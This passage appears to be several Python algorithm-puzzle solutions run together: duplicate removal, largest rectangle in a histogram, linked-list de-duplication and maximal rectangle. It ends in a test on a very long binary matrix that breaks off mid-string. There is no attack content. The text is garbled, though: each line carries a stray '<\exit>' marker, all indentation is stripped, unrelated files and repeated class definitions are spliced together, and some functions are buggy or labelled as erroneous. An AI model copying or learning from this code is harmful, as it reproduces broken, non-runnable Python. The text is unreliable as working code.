elif not duplicate_once:<\exit>
duplicate_once = True<\exit>
close_ptr += 1<\exit>
A[close_ptr] = A[open_ptr]<\exit>
else:<\exit>
continue<\exit>
return close_ptr+1<\exit>
if __name__=="__main__":<\exit>
Solution().removeDuplicates([1, 1, 2, 2])<\exit>
import sys<\exit>
class Solution:<\exit>
def largestRectangleArea(self, height):<\exit>
if not height:<\exit>
return 0<\exit>
n = len(height)<\exit>
gmax = -sys.maxint-1<\exit>
inc_stack = []<\exit>
for i in xrange(n):<\exit>
while inc_stack and height[inc_stack[-1]] > height[i]:<\exit>
last = inc_stack.pop()<\exit>
if inc_stack:<\exit>
area = height[last]*(i-(inc_stack[-1]+1))<\exit>
else:<\exit>
area = height[last]*i<\exit>
gmax = max(gmax, area)<\exit>
inc_stack.append(i)<\exit>
i = n<\exit>
while inc_stack:<\exit>
last = inc_stack.pop()<\exit>
if inc_stack:<\exit>
area = height[last]*(i-(inc_stack[-1]+1))<\exit>
else:<\exit>
area = height[last]*i<\exit>
gmax = max(gmax, area)<\exit>
return gmax<\exit>
def largestRectangleArea_TLE(self, height):<\exit>
if not height:<\exit>
return 0<\exit>
max_area = -1<<32<\exit>
for ind, val in enumerate(height):<\exit>
min_h = val<\exit>
max_area = max(max_area, val*1)<\exit>
for j in xrange(ind, -1, -1):<\exit>
min_h = min(min_h, height[j])<\exit>
current_area = min_h*(ind-j+1)<\exit>
max_area = max(max_area, current_area)<\exit>
return max_area<\exit>
def largestRectangleArea_complex(self, height):<\exit>
if not height:<\exit>
return 0<\exit>
global_max = -1<<32<\exit>
for ind, val in enumerate(height):<\exit>
if ind+1<len(height) and val<=height[ind+1]:<\exit>
continue<\exit>
min_h = val<\exit>
global_max = max(global_max, min_h*1)<\exit>
for j in xrange(ind, -1, -1):<\exit>
min_h = min(min_h, height[j])<\exit>
current_area = min_h*(ind-j+1)<\exit>
global_max = max(global_max, current_area)<\exit>
return global_max<\exit>
def largestRectangleArea_error(self, height):<\exit>
if not height:<\exit>
return 0<\exit>
length = len(height)<\exit>
global_max = -1<<32<\exit>
inc_stack = []<\exit>
i = 0<\exit>
while i<length:<\exit>
if not inc_stack or height[i]>=height[inc_stack[-1]]:<\exit>
inc_stack.append(i)<\exit>
i += 1<\exit>
else:<\exit>
last = inc_stack.pop()<\exit>
if inc_stack:<\exit>
area = height[last] * (i-last)<\exit>
else:<\exit>
area = height[last] * i<\exit>
global_max = max(global_max, area)<\exit>
while inc_stack:<\exit>
last = inc_stack.pop()<\exit>
if inc_stack:<\exit>
area = height[last]*(i-last)<\exit>
else:<\exit>
area = height[last]*i<\exit>
global_max = max(global_max, area)<\exit>
return global_max<\exit>
if __name__=="__main__":<\exit>
height = [4, 2, 0, 3, 2, 5]<\exit>
assert Solution().largestRectangleArea(height) == Solution().largestRectangleArea_complex(height)<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def deleteDuplicates(self, head):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
if cur.next and cur.next.val==cur.val:<\exit>
next_non_duplicate = cur.next<\exit>
while next_non_duplicate and cur.val==next_non_duplicate.val:<\exit>
next_non_duplicate = next_non_duplicate.next<\exit>
pre.next = next_non_duplicate<\exit>
else:<\exit>
pre = pre.next<\exit>
return dummy.next<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def deleteDuplicates(self, head):<\exit>
if not head:<\exit>
return head<\exit>
closed_ptr = head<\exit>
open_ptr = head.next<\exit>
while open_ptr:<\exit>
while open_ptr and closed_ptr.val==open_ptr.val:<\exit>
open_ptr = open_ptr.next<\exit>
closed_ptr.next = open_ptr<\exit>
closed_ptr = closed_ptr.next<\exit>
open_ptr = open_ptr.next if open_ptr else None<\exit>
return head<\exit>
if __name__=="__main__":<\exit>
nodes = [ListNode(1) for _ in range(2)]<\exit>
for i in range(len(nodes)-1):<\exit>
nodes[i].next = nodes[i+1]<\exit>
Solution().deleteDuplicates(nodes[0])<\exit>
class Solution:<\exit>
def maximalRectangle(self, matrix):<\exit>
if not matrix or not matrix[0]:<\exit>
return 0<\exit>
global_max = -1<<32<\exit>
m = len(matrix)<\exit>
n = len(matrix[0])<\exit>
dp_height = [[-1 for _ in xrange(n)] for _ in xrange(m)]<\exit>
dp_height[0] = map(lambda x: int(x), matrix[0])<\exit>
for i in xrange(1, m):<\exit>
for j in xrange(n):<\exit>
if matrix[i][j] == "1":<\exit>
dp_height[i][j] = 1+dp_height[i-1][j]<\exit>
else:<\exit>
dp_height[i][j] = 0<\exit>
for i in xrange(m):<\exit>
inc_stack = []<\exit>
j = 0<\exit>
while j<=n:<\exit>
if not inc_stack or j<n and dp_height[i][j]>=dp_height[i][inc_stack[-1]]:<\exit>
inc_stack.append(j)<\exit>
j += 1<\exit>
else:<\exit>
last = inc_stack.pop()<\exit>
height = dp_height[i][last]<\exit>
if inc_stack:<\exit>
global_max = max(global_max, height*(j-(inc_stack[-1]+1)))<\exit>
else:<\exit>
global_max = max(global_max, height*j)<\exit>
return global_max<\exit>
def get_height(self, matrix, row, col):<\exit>
height = 0<\exit>
for i in xrange(row, -1, -1):<\exit>
if matrix[row][col] == "0":<\exit>
break<\exit>
height += 1<\exit>
return height<\exit>
if __name__=="__main__":<\exit>
assert Solution().maximalRectangle(["01", "01"])==2<\exit>
assert Solution().maximalRectangle(["10001000001111110111111010111100111101001111001011111111101110110110011101101001110011101111001010110100110110111110101111011111110101111111111111111111111101110111111111000111100111111111011010111011","11010111100111111111111011110111111011101111111010101100110001100110101111101101111111010011111011111110111001110111010111111111011111110110011010111110101110111010101101101101110111111101111110100110","11010001100111011011111111111110111111010011011011111011111111110111111110111101111011111101101100111111001111101010111111011101110111011111001111111111111111101111110111111111111010101011111011111111","11111111011111110010110111001111111111111101111111111110100101111101110110001111100110101101111100111111110111001010110100011111111001010011100101011011011111111111110111111101001101110001110111110111","11011000010101101111011101011101101100111111101111111111111001010011011110110111110111111011100000001111111100011011101110110000000110001111111111111110111011011100000111111111110001111100111111111111","11111001101111101111111100111101111111111001011101111111111011111011110111111011110101111111111111111111010111111111111011111110110101111111111001110011010101111011111111111111011011100110111111101111","00111111011011111111100111110111011111111101101011111011110111100111111111111111111001111110000111111011011010111101110111111101111010111011011111110111101101110011111011111111110101111111011110011111","00101110111111011111110110001110111101111111111001111010010101101111010011101111111011011110110111001011001111100101110111111101000111101110111101111111100110011100111011111111011111110111111111110111","11111111011011011101111110111011110111011111111001101111111111011010111101110111111111111111111001000110111111001011011111010110111111101101100111110011110111111111011101110101111110101111111101101111","11101100010111111101111111101110110110111111101111111101111111110111001111000111110110111101111111011110111101101111101111101111010111011111011111101011101111110111111111111111110011111110111110111001","11110111111111001111111101011011101101111111100111111011111101011111111010110011111111111111111011010111111110111101110101111111011111111010011101111101011111110111100001110100111111110111011000011010","11111111101011110010101111101000111111011111101001010111111111110111010110101111101111111111111100101111111111011001101110101011001111111110011111111001111011111111011100111011111111111001110111010111","11111100101110111011110111111101111011111100111011011011111011111011111101000101101101111011111011101111011010100110011110011110011101101101110111111101101111110111110111110101111111100111111111111011","10111111011011000111111101111110001111111110111111111111111111111100111111110111011101111101101011011110010111111111111111101111101011111110111011011011111111111010001110111111110001111111111111111011","01001110100111011111001011011111111111100111110101111111111011110101111111011010110101111111110101010110011011111011100011111011111001101101011111101111011110111011101001101111111101100111111111111111","10111011111011011110111010111101111111011111111110111010011110111011111111111111111111111011111110111011110111111110110111110111011111101111111101011010001100100011101011101111111111111100110111110111","10111000101111111111111111110011010100110010101111101001111111110111111101111101100001110111111111111011110111111011111111110111111111111110111011100111110111111101111111111111111011111111011111111111","10101111111100111011111110111100111010111111110111010110111111111010001110101110111110101111111110111101011111110011000111111111111111111011101101111011011111111011111111101110111101101111111111101111","11111111111111001111111011011111111011000111111100000111101110101110011011111111110110111110101111110011111101110111111101111111110010111011111111101111110111111010011110111011111111111111111111100111","11100101111111111111110111111110111111111101101010111111011101011011111111101001111011111001100111111101011111111101111111011110111100111011111101011101111111111001010101010111111111111101111111111111","11100001111010011111110011001111011011110011110111101110101111111111011011110101111101101011011010111111111111111111111000111111110111011100111100111111101101101011111101110111111011100110110101011110","11011110110111110011011101001111111111101111000101111011111011010111111011111011111011111011111111111011110010111111111111111101111111100111111111101111111111111110111101111101011001110001010111110110","11111110110111111111110101101001111111111101110111100110110110101111110100111011101111111101111001111111110111111001111011111111101101111101111111100001110011111011011011111111111010001101110111111011","10111110111111110111111110111111111110111111011010111000011101011111111101101101111111101111111111101011111111110111111110101111111111111101111011110111111011111111110110111111011011111110110110110111","10111111001111111011110011011110101111111111111011111111111110001111111011101101111111101011001111100111111111111111111111111111101101010111111100011101011111111111010011111111011111111011111110111110","11101011111110111011111111111110110111111101111111111011111001111111111101011111111110011111011101010101111110001111111111101111011111101111110101010110010101111111101111111110111101101111000111111001","11111011101111101001000111011011111010101011111111111111011111110111111111011111111100001101101111111111111111111111101111111111100110111111111111011111111011101111111110111110111101111011101011110110","11111111101110110011011111110111010111111111110111111010111101101110101011111101110011001000110101011101111111010011111111111111011111111011110111111111011110111111010111011111101111110111011111111011","11010111110011110011111101011101111111011011111111111110011111110101101101111100110111111011010010010111001101111101111111011011011011110001111111110111110101101101101111111111011111101011111111111111","11001111100111111101011111000011111111111110111101010111011111101000111111101111110101111111011111111111111111101111111010101111110101110011111101010010011111100110001000111110001111101011111110010110","11111111111011011101011101001101011110111010111111111100000011111011110110110111111011101100111111111101110001110110011111111111111111110111111111111001111011111011111111001111011101111111110110011011","11011101111111111111111111101111111111100101111111111101111111110001101111110111110100101011111111111010111101101111111111011101111001111111111001110111110101110101111100111101110111111011111111111110","11111111111011111111101111110111111101010111111110000101011001110111111111111111111000111111100111111101101111111011011101111110111100110011101100101011100111111110111111011111111111001111101111111011","11111101111011110111111111001111100001111111010011111101100101111001110111111111111111110111110110110101111110111010010001101111101111111100110111111111000101111011011110111111111110111110111001101111","11001111011110111011011011000111110111110001111111110101101111111011110101110111111111111111111111000011111110111111111001111011101101111000101000111110111011101111111111111111110101011111101111111011","10111101001111011101111111011111110111101111110100111011111101111111101010111111111110111111100111111111110111101111110111111101111111000001111111110111010100111110010010111011111111111101111011011011","01111100001110111101111111110010111110110111011111111001111111011010011001111011111011010111011110111110011111111001101111111111111111110111111110100010011011111010101111111001111011110110011011111101","10110001111111101111111110101111001011111111111110011010110101111111111111011011011101101111101110101110110011111011101111111111111011001100111101100111101101010111111111111101011111011011111111001110","11111101110011111111011111111111111011111111011111111111111011111110001111111111111101111111110111111101101111011110111111111101011111111101011010110111111111111111011110100011111101011100111111111111","11111110111111110111011011111111111111111001111111111101111000111001011111101010110111111011010010111010111011001011010111111110011110100101111111111111111011111101101100111111000111011111010111110111","11111110111111101011001001101111111110101101011111111111111101111110100010111110101111111111110101111110111111000011111111001111111000010101111101111111011111110111110110100110111011001111111111111111","10111101111111100011100101111011110110001110100101111111001111111111111111101101011110110001111110111001110010111011011011101010011111111101010111010111101110111111101111111011101111111111110111111110","11101001011111111111001111111011111001101111011111011001110111011101011011111111111010111111111111111010100101011011111111111100101100011001101111111110111011100100100010101011110101110111111111111111","11111111111111010111111111011111010111010000101010110101110111111110111111110111110111111000111011011111101110110111110110111110111101110111111111111110111111011110111110000111110010110011111100111011","01111011111111101111111110110001011111011110101001111011011111111011110111111111101100101011101110111101111111011101111111001111111010111100111101010110110011111111111011110100101010011100111111111011","11111111111111111111110111011111110111101110111101001111110101111101101111111111111111111111011111001011111010001110011110111011111111111111011111111001110111111010111110111101011110101111110111110111","10011111110111101111111111111001001100101011111111111011101111101111111101111111010111001111011111011110101111011111111010111111011110111011110110101111100011101111110001111111111111111111111110010011","11100011111111111111010000111111010011111000101111111111101110111111100100111111110001110111011101111111101111011111111101110011101110001111111011111111111111011111110111110101111110111011110001111111","01100110001110010111111111111111110101111110111100111111110110101111110011111111110101111111111111111101110111011011101011110011101011101111111111011111000011111111111111111111111111111101111110111111","11111111111101110110011100111111111100101111011110110110111111111111101100111010110111101110101010110011111111111101011111101101111111101010110010111110101011111110011111111111101111101110011101101111","10101111111110101111111111110111111111011111110111110111011111011111110111111110011010111110001110111111111101011101111001111111111111111111011001111111011011111100110111111111111110111100111111111111","10101110011101111111101110001101111101111101110111011101101011110110111001110110011111001111111011100100111001001111111110111001111101000110001110101111101101111011111111111011011001111011111010111111","11111111111111101111010110011101111011111111111011010010011111001101010110011001100101100111011111011001101111101111111101000111110111011111101101111101101011101111110001111001100110010101011110111111","01111101101001111101111111111111111111110100111011010111011111111101111101111111011000111111111111110110111111110111111010111111111110111101101111101111111101011111101101111100111111011110111111101111","11001010011101111011111111111110011111110001101111110011110111111110111000010100111111111111011101111011011111111000111111111010101111011111110010001110111111011110111110001011111111110111011111010101","10111111100110111111101111110111111111011101000111101110101111101110111100100011101011101011111101100110110111111111101100111111110011011011010110110110110011011011110111011011001011110111111011111101","10110110111011111101111011111111111111110111110010101000111101110111111111101111111111100010111111111101111111111111111111101111101111011110011111111111101010110101101110011111111110001100101101011111","11010111010111111111110101111100101110111101011100011011011111111100011111110000111110111101010101101111111111011110011111011111111111111111011101011101101001101111111110101011110010111111011111111011","11111111111011111101111111101111100111010101111101011111111110110111011101111111111001110011011011110010110111111111110011110111100011001011101011111101110101101000110111111011111110110111011111111101","11101010111111101101111010110011111111111111011001100101101101110110111001111111011111011101110011011111111111111001101111111111101110111111111111111110101111011101111110011110111111101111101111011111","11000101100111111100101111001111111010111111101111111101111111110111111111001111111111100111010110111110111011010011111111110101111001111101011000111111011011110110110110011111111111111111100111101111","11111111111111111111111111110111111011001111110000110111110111111110111011101011011011111101011100110011111110111011100110111111011111110111101101111011111111111111101110110111001100010101011110011111","11111001011101101111111111001110111111011111111001011111111110101110111001111011111101111110100111111111000101111111110101111111111110010000111001101111111000111101111111111111011111101001011111101100","11110110111011011101111011011011011011011110011111111111111111011110111111111111111111101111111110111110011111111111111110011110111101001111011101100111111010101101111101100110111111111111101111110100","11111111111101111010011101001111011101100111011111101111111000101111111010011111111110110101110111011110111110111001110010011111111001011101011100101111111111110110111010101111111110111111001111111111","11111101111110111111111111011110111101011101111010111111111100111111110111001111111111101011011110111111111001111110110101001110111011101001111011011011111111110111011111110111011101111100111111111111","11111111011011111111111110101101011011111111011110111011111011101101111101001110110011100101111111111111111101111110010010101110111111011101110110111010010100111101001111110011011011010101111111101111","11011111101111111111111111111110111101111111001011111111001101111111111100110111110001101011110110111101100111011011101111100110100110010011111111011001111111111011011011111000111111111011111110111011","11111111101111110111111111001111111110101111110100111100100011101111111100111111101011001101000111100010001111101101011111110101111111011100010111111110111111110111110101110001110010011111111101011111","11111111111101111111011111101011011111011111110110111011111111111011111111101010011111101111001101011110011100101110110111111111011111111110111110111110011111011111110001101111111011110110100111111101","11011101011111101101101110011011100010111100101111111010101101111111100111111110011111111001100111111101011111110011111101111110011111111111110111101111110111111111100001101111111111011110011111011111","10111111011111000111101111101111111001001111111110111111100011111011011111001110010111111111011111110001110111111110111100101110101101001011111011111111111110111111011111001111011101011111111011111110","01111011111111110110011111110011111011001111111101101001111111111111111111010111111111101111111101010111011101111110111111111011010011111011111101101110111011111111010110010110101100111110111111111111","01111111111110111110111111001111111111101111111110101111110000111001111011111111111101111111001101000111111011111111110101000110110111010101111011111111101101111111011111110010111111101111101111110101","10000101110111101111111001001111111111100111111100111111011000111101111101111011011110111100111001110011111011111011101110111111101110101111111111111101011110110111011111110101111111011111100111111111","10111111001111111101110111110011111110010101111010111111110101111010011101111111111111000110100111111011101110111011111111011100111011101111100111100111111111101101101101110011111110101011101111001100","10110101111110111111110011111011011111111111111111011010101110001101111011000111110111111101111101111011011011111111010110101101010010100101111011110101110100001001111101101000111001111011011010111111","11111101111111111011101001111111111000110111010111101111101011110111011010101111111111111101111111111011111101010100111101111111101111010111011001011101110111111110111111110100101111111101111110011111","11001011011011111111001111111011111110110001110011101111111110111101111111111111101111101111111111111010111111011110110111111111111111111111110101110111111101011110111111111110111101100010101110111011","11110011111100000111010111011110000011011111111111011000101011111110011011111111111111111111010001010111110010111111111111110111101111001101010101111111111110110111011101101111111011100111111111111111","01111111111001011101000111111011100111111111111101101111110111111100101111101101011111111101011111101010101111111111101001001110000101110111000111111111101011011101011010111111111111101100111111111111","11011111111101011110011111110111111111010111011111111001110011111101111111111111111001001011100000011001111011111111010111011111111111111111100111111110001111111110111111101111111111111100111011111111","01100011111100001111001101111101011011110100110111011111111111011111100111101111111011111101111011101111001111111111111011111111001110111001111010011111011111000111111011111111101011111001111101110100","11111111111111101111111001001000111011111111001111111111101011011011011001101111111011111011111110111111101111010100111011111100111101111111111111101101011101101111111111111111011111111111001111101110","11111010111100111111101011011101111010101111111111111111001111111111111100111010101011111101111110111111110011001110111111111011110111111111011111101011111011101111101111110111101110110111111110110011","01000111100101101111110101001111110101111101111110110110111000111101111111101001111101111111111111111101111111111011111010101011111011111111111111101111100111011111011010101111111101111110011111111111","11111011111110111111101110101111111011010111111011101011111011101110111101010011011101011110011111110111011110110100101110110011111101111111111111111101011010111011111111111101110101110111101101001110","01111111011100101111101110111111111010010110111110110111111110110011111111100111111111101111111111111101111111110011111110111110001111110000111110011110101010011100111111110111110101111011011111111100","11101011110111011111111110111111111011110110111111011111101111111011101111110011111111100011111111101111000101011111111111011111111111011001101011110001111011111101101001111111010011111010111001111011","11111111111100011111101111111111101110110110011101111111111011011111101111110111101111110111111011111111001001111110011011111011111011111111001110101000111111101000110101101111111011011101100100111111","10110001111111111110111111101111111011111111111111101111111110100101011101011111011011110101111111111110111111111011111001101101111001001111111100011111101111101101111111011111111111110001111111011101","00111011111111110101011111011010111110101110111111001111010011111011000111111111011101110011110111111111110101111111010001111111001110011111011101111111100110110100001111011111101111111101101111111011","10011011011111100111111111001001001111010111011111011111111111111110011111111101001010101111111111111111101111111111110001111010111110110101111110101101101100111111110111111100111011111111011101011101","11111111011100010111111110110111011000101111110111101011111100111111111111111111101111101111111111000111111111111111010101011110010011111011011111110100100101101100111110111110001011011011110110011111","11111111111111110101001111101001111111111111111111011100110010100011101111110011111101111111101100010101111111111011111111101111111111111111111111111011111111111010101011001101111111110101011011111011","11110111010101101111111011111011110110111100110111111110110111110101111111111111011110111111111110111110101111110101010111110010011110101111011010111111111111111101111111110111111010101111111011001111","01101001111111100001110110100010111010101111011011010011111011001100111111100111011111111011111111101110101011111111111111011111011111111010111011011111011101100111011111011111111111010101111111010111","11111110101111100011111111110111110110101111111111110111101111111101110111111101110111110011110110101111111101111111101101111110110010101111111111111001111111111111110111111110011101010101111100111111","01011111011011011011110111111111011101101110010110111111101110001111111010111011010101001111111111101000001111111100100111111001111111111111011110010011111111111101110111111111101101111111001101110101","11110111100011111111101110111111101111111111111111101111001101111101111111101111110111111101110110101111111100111111100110111111110111101111111111111110111011011101111111101110101111111110011111011111","00110111111111100101111111111101111111111110111010111111011101111111011110111111111111110100001111111111111011111101110111101111100111011111111101110110111110110110111101111101011111110110111101111110","11111111110011010111111110111110111110111111111101011111110111011111100111000110110101010011111101001011111111001011111111101011111101111011111111111011101001111111111111111100111110111111011110111010","11110111111010111101111101010111111101110111101111101011001011101101111101111101111100100001111111011011111111111111111111011111011111001101111111111101101111110111111111110101111111011011110111111111","11111111111101011011110110111101111111111111110111001011100100111111111011101101001101001011111110110111011001111111111110100111111110011111110001111111101111011111110111111110101011111101111011111101","01001111111001111111101111101111111101111111111111101111110101111110011111110111011100111111010111111100011111111111111111111011110101101011111110110111111010111011011101111011111011110111110011111011","00011100100011111111111110101110111110111111110111111111011001110010001110011011110110111011111101101111001111110111110111111101111111111111111111111111111101111001110111101110101010001111111110111111","11011111100110111101111111111111111010000011111111011111101110111101111011111111011010111111110101101001111111111111011111000010110111111101111101001011011011111011010111011111011110111111111111001110","11101111111111101111010110111111010111011010101111111110111011011000101110110111111111110111110110110110111111011111010111111001010111100011111110011111011111111100111111011101110110111101111011010011","11011000110010100111001111111010111011010010000011111111111101111010111110100101111111001111111110111111111110001011110011111110101111110111111011000010111011011111011101111111111110110111110001111001","01110111011111011111101010110110111100111111101111111010011111111011111011101110111111111111100101111111111111111000011101001001111111110011111011011111011111001011010011111111111101111111111110111101","11110111110111001111111111111100101100111111111011111101010110110011010111111110101111111111111111111110011111101110011101111111100011011011111111101011000111011011111011001111010110111011111111001110","11111100111111010111111111111110111111110101110111011011111101110111011001111101101011111101111111111111111101111111010101111111110100011111110111011011111111110111111011111110010111111111110111001111","11111001101111111111011111111111111111101111011111110111101111111010010101101100011001111011101011111110110110101111100111111011111111100110101111110011111111111111010001011111110110011111110111101010","11111010111111111111111111100101010011010101111111101110011011010001101111110101011111111111110010110101110000111010111101001000001111011010011111111001001101111110111111111110001101101111101101110111","01011111111100110111010011110110101011111101110110111011110110100001111111111111110011110111001001111001111010111110110111111111111111110111111101110111111111111101011011100010111011110010111111011110","01011111111111111111011111111011111101111011111111001010101011111011110111011111111011010110111111111111101111110011011110111111110101111100011011010111111111111111111111111111111101010111110101111001","11101011100010010110011011111111111111111101101111111111011101110110111111111011000111110111110111111111101110111111110111001011101011101110111101011111111111010111111110111111011110011111111101001111","11111011101111101100011111001111111011111011111110111010111111110111011111111101111011111110011011111101010010011101101110111111111111111101101111111111111111111111111111011111011111111110110111111111","10111111101111110111011111111111111111101111111110111111111010111111100011011100011110011111111111111110110110011110111101110011101011110111110111111111111110100101011111111110011111110111111101011111","11110010111011111011101111110111101100111110111111111111001011111111011111110111111111111011111111111110101101111011110011011111111100110110111111011111110111111111101111111111110101111101111011111111","11111111101111111111010111101011111111011111010111111110110110001011111111111100011001011001000101101110111111110110111111111111111011011110101110111111110111111110111111111111111111111011110001111111","10111011111010110111011110101111101111111111111101111111101011011111101011111111110101111111111011111110110110111111111110111011111011011010100111111101111111011110110111111111100111011111011110111111","01010111111111111110111111111011111101101110111101110001110011011110110101110010111111001100111101111101110111110111000110101111110110011111110111111100111111110111111111000110111111011111111111101110","11010110101010111101110010001111111111101101111011110111111110111111101001111011101111111001011110111110011111111000011111011111011101101110111111011111110111001111011101011111111111111100001101101001","11011101110101101111111101111100111011110100111111011110111111110011111111111011111111010111110111010111111101111110111110111110110111011111110111111100100011011011111111110111110110110101101101111101","11011111111111111110111111110111110110011111110101101101101110001011011110011011111111111111011110110111111110111111111111111110111111111111111111101111111111110101011000101101101111010111111001101001","11011111111111111101111111110111111111001101101010101111111111100111111110101101110110111110110111111101110111111100100111001001110111111111011111001111011110111111101110111111111110111010011101110111","11110010111111011111011001101111100110111100101111111111010111011100111011011111110000011011111101111110111110111011110111010111111111111110111111111111111001111011010110110111111111110110111111011011","01110101111010110111011111111011110110111110010011110111110111111111111110001110101110001011111110110111111111111100110111101111111111101111011100011111111111011010110101011011100101111111111110111001","11111111110111110111001101111110111111010111000111111110111011111111001011111111111111100111111111111111110101111101011000101011101111010001001111101111111011111111010011011110110110011110101110111110","11111010111111011111111011101110111101110111110101110011101101111001111101110100011101011111111111101011111111011110011100110111010101110111111010011101111110111111111100111001101111111100011001110101","11111111111101011011111110001011110111101111110011101111111101011010010110111101011111101111111111101011001011101111011111101101101100011110010111111111111111101111111101111010111111111111001111110111","11101111110100011111101111111111101101111111101110111111110111000111101101011110101010100111111111101111011111111101111111110111111111110111011111111111111110111110010011110110101110101110110111110111","01111111011111111111111110111111110111110010111110111111101110011110101001011101101111111111110001011111011011111001111111100101100011010101110100111111001011111111110111011011110101011100111111100011","11111010111111010110001111111110011011001111111110010101111110000101110001111010011011010111110100111111111110111111111101011011110111011111111010111101001101110111110111111100111111011110110111011111","00111110011111101001111101111101111011011101011111111111111111111110111111110011111111111111011111001111110111111010111111110111111111101110111111001110101110111110111111010111101111001100111101011110","01110111110010111010110110111111101111111111111111111101111111110101111011011101110100111111111110111111111110011111110111011101111001010111101101101111111111111111010011111101111101110011010111111101","01111111111111111111010111111111110011111101111111111100011101111011110110111011001111111111111000111101111111011110100111111111111011111111111001111101111011111111111110111101111010111010111111111111","11110110110111111011100111011010101111101110101101111101011010111111001111101001111111111110111001101111011111111101011110111110011101101011111111111111111110111111111110011110111110101111010101111101","10011111111111001110101101011000101011111110111111111111111110111000111111110111011110111111101001110101111111110011110011111011111111101111000000111111101100111010111111111011100011111011011110011011","11010101110111111111101011111110111111111011111111101101011111111010111110101001111001101111110111101010011110111111111111111111111110110010011110111010111110111001101100111011001101100111100100000010","01111011011001000110011111011101111010111011111111011111111101011111111111111011111111001011110111111110111011111101111111110111111110111011110111011111111111000111011110111110111011111110010111111111","11001111101111101101010101111111101111101111010111111101111101111011111100101111000111100110111110001111111011111110011101110110111100011010111111101111111110111111011110101111111111101110100111111011","00110111010111111010011011011101111101110111010011011001101111111110111100111111111111101110001011011111111100111111101111111011100111111111101110110111111011111111111011111110011011111011111111111101","11100000011101110111110111110101111011111110111101011111110110001110111101110110010111011011011111111111000011111010110111100111111111010111111010101011101110111000011111111011110011111011110011011111","01111111111111111011111110111011101010111111011111111110111110100000011111010111110110111011011111111011110101111101111111111011111110011011111111101110011111010111110011111010000111111100001011110111","10100000011111111101111111011101111111011111111101111100111111111111110101000111101101110000111110111111011111100110111111111011001111011111111001111111111111111011011111111111011110111101011111110111","01101010101101111111111110110110010011010100111101111101111011011011010010101111110101101101101011110111111111011111101011111110011110111101101111111111111011011111110111110001110111011111101111111110","11111110110110011111101111101101111011000011011011001110000111110010111001111111110001011011100100110110011011111111111111111111111111111011101111010111010111011011101111111110001011010001110011011100","01111111111101101011011111100101111011110010110111111110111011110111111101111111111011100101110111111111101111101111111011110101111110011110011101101111101111101110111111111001111101010111101011011110","11111111111011111111111110111111101111011111001111110001011010110111011000011110101101111101110111010110111011011111101111111111111111111110111111111111111111111101111000101111101011110101110010111111","00110111111011111111011111011011010011110111101111111011110111011010111100111111101100111110111111101110111110100110110110111111111101111011110111111111111111111111011100111110101011001101111100100010","01111011111111111011110111111110111110111110011111111110101111111111110101111011111010010001010101101111101011001100111110111101011111110110111111111110011111111010011001111111111111111011110010111101","01101111111111111011111111110111111100110111111111011111111111111111110111111111111111100111101011111111011110110011111110111110111101101000011110110101110011011110110010011110011001111011101110111111","11011001111111111100101101011111111111111001110110010110101110001111011111111110111111110111111111110111111111010111101111111111111111101100100111111110111100111011111111101111110011110010011110111111","11111011110101101111111110111110010111100110110111110011011110011000111110111110001001101101100110001110111011011111111111110111101110101001100111110111011010111111111111001101111110111100111111111111","11101101111111111010101111111111101011111110110001110011110111001110111101111101111111011110110100111111111101011100110011011111111100011101100110101101001111111010011111011011011101000011110111111110","11111011111111111111101110010111000100111110111111011111111101001111111111011110011110101011011101111001111111111011101111110111011101011001011101100011111111111001101111001101111111111011111101111011","01110111000111101101110101111111010111111101110010101111111111011011111111111111101101001111111101110101011111111011111110111111101111110111110111011111101111011110111101111111111111101111101111001111","10111110011111110110000111111011111010011110011111011000111111111011011111111111111111010111110111101011111111101111101111111111001100111111001101111011110111111001011111111101011011111111010110111001","11111111011111101111110111011111101111111100101111110011110101111111111111011000111110011011111101101011011100111011011111111110101101001111011011111111001111111110111110101011101111111011010111011101","11111010011000111111110111111111110011100110111111011011101011111110010000011011111111101111110111111111111111111110100111011011010111111111110111111111011111110101111100111111111110011111111101110110","11011011111011111010101111111111111111110111111011111111110101111111111100110111101011111110011111111111100111111111111110111111101011101111001111111001111111101111110101101001010111110111011111000010","11111001110011111101111111111111100111111111011111111101111001111111111111111101110110111111011110001111111111011111110011010111101111110111011111011010011001111110111111111011111111110111101111101111","10111111111011111101111101111101110111011011111111110110010110011101101100010111010011011101101101111101111100111011101110110111110111111111111111111111110001011111110011101111111101100011111011111111","00111111110101101111100101101011111011110010101110101101111111111101011010010011111111111101011100100110111111111011111111011111111111100111111111111101110011101111111111111111011110111111111111111101","11111101011101101011011111010011111111011010111100001111111101111101010111111101101111011011111111011001111111111111001111011111011101011111111110110110011111011111111110111111111111111110111111111011","01011101111101011110110010111111110111111001101111101001011111111110001101111110111111111111111111111111111011111101110110111111101010101001111001110111111110100101111111110111011010100011111011111111","11111111111010110100110011101001111000101101111111111011101111111111011101111011111111011101111111111001111011110111110111011111111011101111011010101110011010111011111101111111111110111011011111010100","11111111100011111011110110111110110111101101111111110111111110101010111001110101111111011110100111111011110111011111110001101110111111111111111111110110101110111101101101111111100111110010010001111111","11111101101101011101011011110111111101011101111011110111111111110010111010110111001011111110000011111001011100011110111110110111110010111100100111111110101111001001010101101100011001111111011111011011","11110110101111111011010110110011100111101111111101010011010011111100010111101011110111110101110111111111111111111011111110101110111111011011111011111111111001101011010111111111110111110111101100100101","01111110111100001111010011110110011111111111111111011011111111101010001111111111011111101111001111111111110001101111110111111111111110111111011111010111111111011111101011111111111101011101111011110101","11101101111111110101011101111101111011010111011001111110011111101111010001101101011100101111111011110110111011011111100001111111001111101110011111101101101011111001111001101111111111011011110110011111","01111111011101111111111011111101111011011111111111110111010011101111111101101010111111110111101110111111111011001111000110011111111110111111111110110011011011110001110101111100101001110011111111010110","01101001011011111110011101000101101011111101011100101111110111010110110100011111111110101101101111101110111110110101111111011101111111111101110110111111111111111111111111111101111101010111000111010011","10111101111111100011011111111111111011111011111111011111111111011111111111000111101110111010111111011111111101011101101101101111111111110100101111101110100111111111110110100111101111111111011001101101","11111010010011111111101001111000111110111110001111101101101101111010111111111111100010101011110111101011111111111111111111100011011111001111010111011101101111101111101110111111101111111111001111111110","11110111111111111101111001111011101110110111101111111110111111011111111000100011111101111001101110011110111111101001111111111111100011011110110001111101101111011010111111100101111111001111111110111101","1111111110001100111110011100011111101111111111111000001111110011101011101011111111111111111111011110111